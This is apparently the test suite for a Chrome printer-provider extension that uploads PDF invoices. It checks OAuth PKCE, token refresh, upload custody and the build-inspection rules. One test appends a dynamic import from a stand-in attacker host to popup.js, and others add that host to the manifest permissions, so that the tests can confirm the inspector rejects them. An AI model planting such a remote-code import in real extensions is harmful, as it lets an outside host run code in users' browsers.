import assert from 'node:assert/strict';
import { appendFile, mkdtemp, readFile, rm, writeFile } from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import { after, before, test } from 'node:test';
import { pathToFileURL } from 'node:url';

import { buildProduct } from './build-browser-extension.mjs';
import {
  loadProductProfile,
  ProductCliError,
  productLocales,
} from './browser-extension-product-cli.mjs';
import { inspectExtension } from './inspect-browser-extension.mjs';

let build;
let temporary;
let configuration;
let core;
let intake;
let oauth;
let storage;

function chromeStorageMock() {
  const values = new Map();
  const local = {
    async get(keys) {
      const names = Array.isArray(keys) ? keys : [keys];
      return Object.fromEntries(
        names.filter((key) => values.has(key)).map((key) => [key, values.get(key)]),
      );
    },
    async set(entries) {
      for (const [key, value] of Object.entries(entries)) values.set(key, structuredClone(value));
    },
    async remove(keys) {
      for (const key of Array.isArray(keys) ? keys : [keys]) values.delete(key);
    },
    async setAccessLevel() {},
  };
  return { values, local };
}

function installChromeMock() {
  const storageMock = chromeStorageMock();
  globalThis.chrome = {
    runtime: { id: 'bglmjpfbiofbjcidiceblanlmmfikjil', getURL: (value) => value },
    identity: {
      getRedirectURL: () => 'https://bglmjpfbiofbjcidiceblanlmmfikjil.chromiumapp.org/',
      launchWebAuthFlow: async () => undefined,
    },
    storage: { local: storageMock.local },
    i18n: { getMessage: (key) => key },
  };
  return storageMock;
}

before(async () => {
  temporary = await mkdtemp(path.join(os.tmpdir(), 'fin3000-extension-test-'));
  build = await buildProduct('qa', path.join(temporary, 'build'));
  installChromeMock();
  const moduleUrl = (name) => pathToFileURL(path.join(build.loadUnpackedPath, name)).href;
  configuration = await import(moduleUrl('config.js'));
  core = await import(moduleUrl('core.js'));
  storage = await import(moduleUrl('storage.js'));
  oauth = await import(moduleUrl('oauth.js'));
  intake = await import(moduleUrl('intake.js'));
});

after(async () => {
  delete globalThis.chrome;
  delete globalThis.fetch;
  await rm(temporary, { recursive: true, force: true });
});

test('QA and production profiles have separate stable identities', async () => {
  const qa = await loadProductProfile('qa');
  assert.equal(qa.profile.extensionId, 'bglmjpfbiofbjcidiceblanlmmfikjil');
  assert.equal(qa.redirectUri, `https://${qa.profile.extensionId}.chromiumapp.org/`);

  const production = await loadProductProfile('production');
  assert.equal(production.profile.extensionId, 'nchhenonjehkpmjmekbmeciififfaaem');
  assert.equal(production.redirectUri, 'https://nchhenonjehkpmjmekbmeciififfaaem.chromiumapp.org/');
  assert.equal(production.profile.oauthClientId, 'fin3000-chrome-print');
  assert.deepEqual(production.profile.uploadOrigins, ['https://fsn1.your-objectstorage.com']);
  assert.notEqual(production.profile.extensionId, qa.profile.extensionId);

  const storeIdQa = await loadProductProfile('store-id-qa');
  assert.equal(storeIdQa.profile.extensionId, production.profile.extensionId);
  assert.equal(storeIdQa.profile.publicKey, production.profile.publicKey);
  assert.equal(storeIdQa.profile.oauthClientId, production.profile.oauthClientId);
  assert.equal(storeIdQa.profile.apiOrigin, qa.profile.apiOrigin);
  assert.equal(storeIdQa.profile.frontendOrigin, qa.profile.frontendOrigin);
  assert.equal(storeIdQa.profile.profile, 'store-id-qa');
  assert.equal(storeIdQa.redirectUri, production.redirectUri);
});

test('runtime configuration rejects unknown keys, unsafe production origins and duplicates', async () => {
  const valid = JSON.parse(
    await readFile(path.join(build.loadUnpackedPath, 'config.json'), 'utf8'),
  );
  assert.equal(configuration.validateConfig(valid).profile, 'qa');
  assert.throws(
    () => configuration.validateConfig({ ...valid, unexpected: true }),
    /CONFIG_KEYS_INVALID/,
  );
  assert.throws(
    () =>
      configuration.validateConfig({
        ...valid,
        uploadOrigins: [valid.uploadOrigins[0], valid.uploadOrigins[0]],
      }),
    /UPLOAD_ORIGIN_DUPLICATE/,
  );
  assert.throws(
    () => configuration.validateConfig({ ...valid, profile: 'production' }),
    /PRODUCTION_HTTPS_REQUIRED/,
  );
  assert.throws(
    () => configuration.validateConfig({ ...valid, apiOrigin: `${valid.apiOrigin}/` }),
    /API_ORIGIN_INVALID/,
  );
});

test('QA build is minimal, localized and reproducible', async () => {
  const manifest = JSON.parse(
    await readFile(path.join(build.loadUnpackedPath, 'manifest.json'), 'utf8'),
  );
  assert.deepEqual([...manifest.permissions].sort(), [
    'identity',
    'notifications',
    'printerProvider',
    'storage',
  ]);
  assert.equal('content_scripts' in manifest, false);
  assert.equal(
    manifest.host_permissions.some((host) => /vodafone|telekom|\*:\/\//i.test(host)),
    false,
  );
  assert.equal(build.inspection.localeCount, productLocales.length);
  const second = await buildProduct('qa', path.join(temporary, 'second'));
  assert.equal(second.artifactHash, build.artifactHash);
  assert.equal(second.zipHash, build.zipHash);
});

test('Store-ID QA build is unmistakably non-store and keeps the reserved identity', async () => {
  const storeIdQa = await buildProduct('store-id-qa', path.join(temporary, 'store-id-qa'));
  assert.equal(storeIdQa.extensionId, 'nchhenonjehkpmjmekbmeciififfaaem');
  assert.equal(storeIdQa.notForStore, true);
  assert.match(
    await readFile(path.join(storeIdQa.loadUnpackedPath, 'NOT_FOR_STORE.txt'), 'utf8'),
    /NOT FOR CHROME WEB STORE/,
  );
  assert.equal(storeIdQa.inspection.profile, 'store-id-qa');

  const production = await buildProduct('production', path.join(temporary, 'production'));
  await assert.rejects(
    readFile(path.join(production.loadUnpackedPath, 'NOT_FOR_STORE.txt')),
    (error) => error?.code === 'ENOENT',
  );
  assert.equal(production.notForStore, false);
});

test('artifact inspection rejects remote or dynamically evaluated code in every executable file', async () => {
  const tampered = await buildProduct('qa', path.join(temporary, 'tampered'));
  await appendFile(
    path.join(tampered.loadUnpackedPath, 'popup.js'),
    "\nimport('https://attacker.invalid/remote.js');\n",
  );
  await assert.rejects(
    inspectExtension(tampered.loadUnpackedPath, 'qa'),
    (error) => error instanceof ProductCliError && error.code === 'REMOTE_CODE_POLICY_INVALID',
  );
});

test('artifact inspection rejects undeclared hosts and optional access surfaces', async () => {
  const broadHost = await buildProduct('qa', path.join(temporary, 'broad-host'));
  const broadHostManifestPath = path.join(broadHost.loadUnpackedPath, 'manifest.json');
  const broadHostManifest = JSON.parse(await readFile(broadHostManifestPath, 'utf8'));
  broadHostManifest.host_permissions.push('https://attacker.invalid/*');
  await writeFile(broadHostManifestPath, JSON.stringify(broadHostManifest), 'utf8');
  await assert.rejects(
    inspectExtension(broadHost.loadUnpackedPath, 'qa'),
    (error) => error instanceof ProductCliError && error.code === 'HOST_PERMISSION_BROAD',
  );

  const optionalAccess = await buildProduct('qa', path.join(temporary, 'optional-access'));
  const optionalManifestPath = path.join(optionalAccess.loadUnpackedPath, 'manifest.json');
  const optionalManifest = JSON.parse(await readFile(optionalManifestPath, 'utf8'));
  optionalManifest.optional_host_permissions = ['https://attacker.invalid/*'];
  await writeFile(optionalManifestPath, JSON.stringify(optionalManifest), 'utf8');
  await assert.rejects(
    inspectExtension(optionalAccess.loadUnpackedPath, 'qa'),
    (error) => error instanceof ProductCliError && error.code === 'HOST_PERMISSION_BROAD',
  );
});

test('printer callback exposes one raw CDD level for desktop Chrome', () => {
  assert.equal(core.PRINTER_CAPABILITIES.version, '1.0');
  assert.equal(core.PRINTER_CAPABILITIES.capabilities, undefined);
  assert.deepEqual(core.PRINTER_CAPABILITIES.printer.supported_content_type, [
    { content_type: 'application/pdf' },
  ]);
  assert.deepEqual(core.EMPTY_PRINTER_CAPABILITIES, {});
});

test('PDF admission, filename cleanup and callback are fail-closed', async () => {
  const job = {
    printerId: 'fin3000-incoming-invoice',
    title: '../ Rechnung\u0000.PDF',
    ticket: {},
    contentType: 'application/pdf',
    document: new Blob(['%PDF-1.7\nbody'], { type: 'application/pdf' }),
  };
  const admitted = await core.assertPdfDocument(job, job.printerId, 20 * 1024 * 1024);
  assert.equal(admitted.filename, 'Rechnung.pdf');
  const calls = [];
  const callback = core.createExactlyOnceCallback((result) => calls.push(result));
  assert.equal(callback('OK'), true);
  assert.equal(callback('FAILED'), false);
  assert.deepEqual(calls, ['OK']);
  await assert.rejects(
    core.assertPdfDocument({ ...job, document: new Blob(['not pdf']) }, job.printerId, 100),
    (error) => error.code === 'INVALID_PDF' && error.printResult === 'INVALID_DATA',
  );
  await assert.rejects(
    core.assertPdfDocument(job, job.printerId, 2),
    (error) => error.code === 'PDF_TOO_LARGE' && error.printResult === 'INVALID_DATA',
  );
});

test('OAuth uses PKCE S256, exact state and never sends a client secret', async () => {
  const mock = installChromeMock();
  const requests = [];
  chrome.identity.launchWebAuthFlow = async ({ url }) => {
    const authorize = new URL(url);
    assert.equal(authorize.searchParams.get('code_challenge_method'), 'S256');
    assert.ok(authorize.searchParams.get('code_challenge').length >= 43);
    assert.equal(authorize.searchParams.has('client_secret'), false);
    return `${chrome.identity.getRedirectURL()}?code=authorization-code&state=${authorize.searchParams.get('state')}&iss=${encodeURIComponent(config.apiOrigin)}`;
  };
  globalThis.fetch = async (url, init = {}) => {
    requests.push({ url: String(url), init });
    if (String(url).endsWith('/o/token/')) {
      assert.equal(String(init.body).includes('client_secret'), false);
      return Response.json({
        access_token: 'access-token-1234567890',
        refresh_token: 'refresh-token-1234567890',
        expires_in: 1800,
        scope: 'intake:write',
        token_type: 'Bearer',
      });
    }
    return Response.json({
      subject: 'bp_12345678901234567890123456789012',
      accountName: 'Beispiel GmbH',
      protocolVersion: 1,
    });
  };
  const config = {
    apiOrigin: 'http://127.0.0.1:8000',
    frontendOrigin: 'http://127.0.0.1:4200',
    oauthClientId: 'fin3000-chrome-print-qa',
    operationDeadlineMs: 30_000,
  };
  const auth = await oauth.connectAccount(config);
  assert.equal(auth.accountName, 'Beispiel GmbH');
  assert.equal(requests.length, 2);
  assert.equal(
    requests.every(({ init }) => init.signal instanceof AbortSignal),
    true,
  );
  assert.equal(mock.values.get('authState').accessToken, 'access-token-1234567890');

  await mock.local.remove(['authState', 'printOperation']);
  chrome.identity.launchWebAuthFlow = async ({ url }) => {
    const authorize = new URL(url);
    return `${chrome.identity.getRedirectURL()}?code=x&state=${authorize.searchParams.get('state')}x&iss=${encodeURIComponent(config.apiOrigin)}`;
  };
  await assert.rejects(
    oauth.connectAccount(config),
    (error) => error.code === 'OAUTH_STATE_INVALID',
  );

  chrome.identity.launchWebAuthFlow = async ({ url }) => {
    const authorize = new URL(url);
    return `${chrome.identity.getRedirectURL()}?code=x&state=${authorize.searchParams.get('state')}`;
  };
  await assert.rejects(
    oauth.connectAccount(config),
    (error) => error.code === 'OAUTH_ISSUER_INVALID',
  );

  chrome.identity.launchWebAuthFlow = async () => {
    throw new Error('user closed the window');
  };
  await assert.rejects(oauth.connectAccount(config), (error) => error.code === 'OAUTH_CANCELLED');
});

test('refresh is single-flight and an interrupted rotation never reuses the old token', async () => {
  installChromeMock();
  const config = {
    apiOrigin: 'http://127.0.0.1:8000',
    frontendOrigin: 'http://127.0.0.1:4200',
    oauthClientId: 'fin3000-chrome-print-qa',
    operationDeadlineMs: 30_000,
  };
  const expired = {
    protocolVersion: 1,
    accessToken: 'expired-access-1234567890',
    refreshToken: 'rotating-refresh-1234567890',
    expiresAt: Date.now() - 1,
    subject: 'bp_12345678901234567890123456789012',
    accountName: 'Beispiel GmbH',
  };
  await storage.writeAuth(expired);
  let tokenRequests = 0;
  globalThis.fetch = async (url) => {
    if (String(url).endsWith('/o/token/')) {
      tokenRequests += 1;
      await Promise.resolve();
      return Response.json({
        access_token: 'new-access-token-1234567890',
        refresh_token: 'new-refresh-token-1234567890',
        expires_in: 1800,
        scope: 'intake:write',
        token_type: 'Bearer',
      });
    }
    return Response.json({
      subject: expired.subject,
      accountName: expired.accountName,
      protocolVersion: 1,
    });
  };

  const [first, second] = await Promise.all([oauth.validAuth(config), oauth.validAuth(config)]);
  assert.equal(tokenRequests, 1);
  assert.equal(first.accessToken, 'new-access-token-1234567890');
  assert.equal(second.accessToken, first.accessToken);

  await storage.writeAuth(expired);
  await storage.writeRefreshMarker({
    protocolVersion: 1,
    subject: expired.subject,
    startedAt: Date.now() - 1_000,
  });
  tokenRequests = 0;
  await assert.rejects(oauth.validAuth(config), (error) => error.code === 'NOT_CONNECTED');
  assert.equal(tokenRequests, 0);
  assert.equal(await storage.readAuth(), null);
  assert.equal(await storage.readRefreshMarker(), null);
});

test('principal changes clear the pending operation and offline disconnect is locally final', async () => {
  const mock = installChromeMock();
  const now = Date.now();
  const auth = {
    protocolVersion: 1,
    accessToken: 'access-token-1234567890',
    refreshToken: 'refresh-token-1234567890',
    expiresAt: now + 300_000,
    subject: 'bp_12345678901234567890123456789012',
    accountName: 'Beispiel GmbH',
  };
  const operation = {
    protocolVersion: 1,
    operationId: 'operation-principal-change',
    subject: auth.subject,
    clientBatchId: '11111111-1111-4111-8111-111111111111',
    clientItemId: '33333333-3333-4333-8333-333333333333',
    stage: 'manifest',
    createdAt: now,
    updatedAt: now,
  };
  await storage.writeAuth(auth);
  await storage.writeOperation(operation);
  const config = {
    apiOrigin: 'http://127.0.0.1:8000',
    oauthClientId: 'fin3000-chrome-print-qa',
    operationDeadlineMs: 30_000,
  };
  globalThis.fetch = async () =>
    Response.json({
      subject: 'bp_99999999999999999999999999999999',
      accountName: 'Anderes Konto',
      protocolVersion: 1,
    });
  await assert.rejects(
    oauth.verifyCurrentPrincipal(config),
    (error) => error.code === 'ACCOUNT_CHANGED',
  );
  assert.equal(await storage.readAuth(), null);
  assert.equal(await storage.readOperation(), null);

  await storage.writeAuth(auth);
  await storage.writeOperation(operation);
  globalThis.fetch = async () => {
    throw new Error('offline');
  };
  await oauth.disconnectAccount(config);
  assert.equal(await storage.readAuth(), null);
  assert.equal(await storage.readOperation(), null);
  assert.equal(mock.values.has('refreshPending'), false);
  assert.equal((await storage.readStatus()).messageKey, 'statusConnectFirst');
});

test('direct intake sends the token only to Fin3000 and reports success only after custody', async () => {
  const mock = installChromeMock();
  const now = Date.now();
  await storage.writeAuth({
    protocolVersion: 1,
    accessToken: 'access-token-1234567890',
    refreshToken: 'refresh-token-1234567890',
    expiresAt: now + 300_000,
    subject: 'bp_12345678901234567890123456789012',
    accountName: 'Beispiel GmbH',
  });
  const calls = [];
  globalThis.fetch = async (url, init = {}) => {
    const href = String(url);
    const authorization = new Headers(init.headers).get('Authorization');
    calls.push({ href, authorization, credentials: init.credentials, redirect: init.redirect });
    if (href.endsWith('/principal/')) {
      return Response.json({
        subject: 'bp_12345678901234567890123456789012',
        accountName: 'Beispiel GmbH',
        protocolVersion: 1,
      });
    }
    if (href.endsWith('/manifest/')) {
      const body = JSON.parse(init.body);
      return Response.json({
        id: '11111111-1111-4111-8111-111111111111',
        clientBatchId: body.clientBatchId,
        items: [
          {
            id: '22222222-2222-4222-8222-222222222222',
            clientItemId: body.items[0].clientItemId,
            acceptedAt: null,
          },
        ],
      });
    }
    if (href.endsWith('/intent/')) {
      return Response.json({
        method: 'POST',
        url: 'https://fsn1.your-objectstorage.com/quarantine',
        fields: { key: 'opaque/server/key', policy: 'opaque-policy' },
      });
    }
    if (href === 'https://fsn1.your-objectstorage.com/quarantine') {
      assert.equal(authorization, null);
      assert.ok(init.body instanceof FormData);
      // A 5xx response may arrive after S3 accepted the body. Custody, not
      // this ambiguous response, decides whether Chrome receives success.
      return new Response(null, { status: 503 });
    }
    if (href.endsWith('/complete/')) {
      return Response.json({
        id: '22222222-2222-4222-8222-222222222222',
        clientItemId: JSON.parse(init.body).clientItemId,
        acceptedAt: new Date().toISOString(),
        custody: 'stored_isolated',
      });
    }
    throw new Error(`unexpected request ${href}`);
  };
  const config = {
    apiOrigin: 'http://127.0.0.1:8000',
    frontendOrigin: 'http://127.0.0.1:4200',
    uploadOrigins: ['https://fsn1.your-objectstorage.com'],
    oauthClientId: 'fin3000-chrome-print-qa',
    printerId: 'fin3000-incoming-invoice',
    maxFileBytes: 20 * 1024 * 1024,
    operationDeadlineMs: 300_000,
  };
  const result = await intake.transferPrintJob(config, {
    printerId: config.printerId,
    title: 'Rechnung 2026',
    ticket: {},
    contentType: 'application/pdf',
    document: new Blob(['%PDF-1.7\nsynthetic'], { type: 'application/pdf' }),
  });
  assert.equal(result.kind, 'accepted');
  const acceptedOperation = await storage.readOperation();
  assert.equal(acceptedOperation.stage, 'accepted');
  assert.equal(acceptedOperation.operationId, result.operationId);
  assert.equal('document' in acceptedOperation, false);
  assert.equal('filename' in acceptedOperation, false);
  assert.equal('url' in acceptedOperation, false);
  assert.equal((await storage.readStatus()).kind, 'success');
  assert.equal(
    calls
      .filter((call) => call.authorization)
      .every((call) => call.href.startsWith(config.apiOrigin)),
    true,
  );
  assert.equal(mock.values.has('printOperation'), true);
});

test('restart after an S3 upload retries idempotent completion with bounded backoff', async () => {
  for (const stage of ['upload', 'completion']) {
    installChromeMock();
    const now = Date.now();
    const subject = 'bp_12345678901234567890123456789012';
    const clientItemId = '33333333-3333-4333-8333-333333333333';
    const serverItemId = '22222222-2222-4222-8222-222222222222';
    await storage.writeAuth({
      protocolVersion: 1,
      accessToken: 'access-token-1234567890',
      refreshToken: 'refresh-token-1234567890',
      expiresAt: now + 300_000,
      subject,
      accountName: 'Beispiel GmbH',
    });
    await storage.writeOperation({
      protocolVersion: 1,
      operationId: `operation-${stage}`,
      subject,
      clientBatchId: '11111111-1111-4111-8111-111111111111',
      clientItemId,
      serverBatchId: '11111111-1111-4111-8111-111111111111',
      serverItemId,
      stage,
      createdAt: now,
      updatedAt: now,
    });
    let completionCalls = 0;
    globalThis.fetch = async (url) => {
      const href = String(url);
      if (href.endsWith('/principal/')) {
        return Response.json({ subject, accountName: 'Beispiel GmbH', protocolVersion: 1 });
      }
      if (href.endsWith(`/items/${serverItemId}/`)) {
        return Response.json({ id: serverItemId, clientItemId, acceptedAt: null });
      }
      if (href.endsWith('/complete/')) {
        completionCalls += 1;
        if (stage === 'completion' && completionCalls === 1) {
          return Response.json(
            { code: 'OBJECT_NOT_VISIBLE' },
            { status: 425, headers: { 'Retry-After': '0' } },
          );
        }
        return Response.json({
          id: serverItemId,
          clientItemId,
          acceptedAt: new Date().toISOString(),
          custody: 'stored_isolated',
        });
      }
      throw new Error(`unexpected request ${href}`);
    };
    const outcome = await intake.reconcileStoredOperation({
      apiOrigin: 'http://127.0.0.1:8000',
      oauthClientId: 'fin3000-chrome-print-qa',
      operationDeadlineMs: 30_000,
    });
    assert.equal(outcome.kind, 'accepted');
    assert.equal((await storage.readOperation()).stage, 'accepted');
    assert.equal(completionCalls, stage === 'completion' ? 2 : 1);
  }
});

test('definitive restart reconciliation failure clears IDs and stale UI status expires', async () => {
  const mock = installChromeMock();
  const now = Date.now();
  const subject = 'bp_12345678901234567890123456789012';
  const clientItemId = '33333333-3333-4333-8333-333333333333';
  const serverItemId = '22222222-2222-4222-8222-222222222222';
  await storage.writeAuth({
    protocolVersion: 1,
    accessToken: 'access-token-1234567890',
    refreshToken: 'refresh-token-1234567890',
    expiresAt: now + 300_000,
    subject,
    accountName: 'Beispiel GmbH',
  });
  await storage.writeOperation({
    protocolVersion: 1,
    operationId: 'operation-definitive-failure',
    subject,
    clientBatchId: '11111111-1111-4111-8111-111111111111',
    clientItemId,
    serverItemId,
    stage: 'completion',
    createdAt: now,
    updatedAt: now,
  });
  globalThis.fetch = async (url) => {
    const href = String(url);
    if (href.endsWith('/principal/')) {
      return Response.json({ subject, accountName: 'Beispiel GmbH', protocolVersion: 1 });
    }
    if (href.endsWith(`/items/${serverItemId}/`)) {
      return Response.json({ id: serverItemId, clientItemId, acceptedAt: null });
    }
    if (href.endsWith('/complete/')) {
      return Response.json({ code: 'PAYLOAD_MISMATCH' }, { status: 422 });
    }
    throw new Error(`unexpected request ${href}`);
  };
  assert.equal(
    (
      await intake.reconcileStoredOperation({
        apiOrigin: 'http://127.0.0.1:8000',
        oauthClientId: 'fin3000-chrome-print-qa',
        operationDeadlineMs: 30_000,
      })
    ).kind,
    'not-sent',
  );
  assert.equal(await storage.readOperation(), null);

  mock.values.set('uiStatus', {
    kind: 'success',
    messageKey: 'statusAccepted',
    updatedAt: now - 24 * 60 * 60 * 1000 - 1,
  });
  assert.equal((await storage.readStatus()).kind, 'ready');
  assert.equal(mock.values.has('uiStatus'), false);
});

test('native print callback is settled before fallible status bookkeeping', async () => {
  const background = await readFile(path.join(build.loadUnpackedPath, 'background.js'), 'utf8');
  assert.match(background, /finish\('OK'\);\s*await Promise\.allSettled/);
  assert.match(background, /finish\('FAILED'\);\s*await Promise\.allSettled/);
  assert.match(
    background,
    /finish\(error instanceof ExtensionError \? error\.printResult : 'FAILED'\);\s*await Promise\.allSettled/,
  );
});

test('popup worker response cannot expose OAuth tokens', async () => {
  const background = await readFile(path.join(build.loadUnpackedPath, 'background.js'), 'utf8');
  const popup = await readFile(path.join(build.loadUnpackedPath, 'popup.js'), 'utf8');
  assert.equal(background.includes('accessToken: auth.accessToken'), false);
  assert.equal(background.includes('refreshToken: auth.refreshToken'), false);
  assert.equal(popup.includes('accessToken'), false);
  assert.equal(popup.includes('refreshToken'), false);
});
